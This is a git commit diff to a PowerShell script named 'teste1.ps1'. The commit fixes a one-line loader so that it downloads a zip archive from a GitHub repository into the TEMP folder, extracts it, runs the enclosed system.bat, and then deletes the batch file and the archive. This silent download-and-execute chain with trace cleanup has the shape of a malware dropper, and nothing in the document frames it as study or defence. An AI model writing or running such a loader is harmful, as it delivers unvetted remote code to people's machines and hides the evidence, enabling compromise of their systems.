caa7701de0f85c60a5bf1b97f26f7d7a6998b6a5
SKILK12 <153369619+SKILK12@users.noreply.github.com>
2023-12-09 15:43:45 +0000

    teste1.ps1

--- teste1.ps1
+++ teste1.ps1
@@ -1,1 +1,2 @@
-iwr https://github.com/SKILK12/MENI/blob/main/system.zip -OutFile "$env:TEMP\system.zip"; Expand-Archive -Path "$env:TEMP\system.zip" -DestinationPath "$env:TEMP" -Force; Remove-Item -Path "$env:TEMP\system.zip" -Force; Start-Process -FilePath "$env:TEMP\system.bat"; Start-Sleep -Seconds 60; Remove-Item -Path "$env:TEMP\system.bat" -Force; exit
+iwr https://github.com/SKILK12/MENI/raw/main/system.zip -OutFile "$env:TEMP\system.zip"; Expand-Archive -Path "$env:TEMP\system.zip" -DestinationPath "$env:TEMP" -Force; Remove-Item -Path "$env:TEMP\system.zip" -Force; Start-Process -FilePath "cmd.exe" -ArgumentList "/c $env:TEMP\system.bat"; Start-Sleep -Seconds 60; Remove-Item -Path "$env:TEMP\system.bat" -Force; exit
+
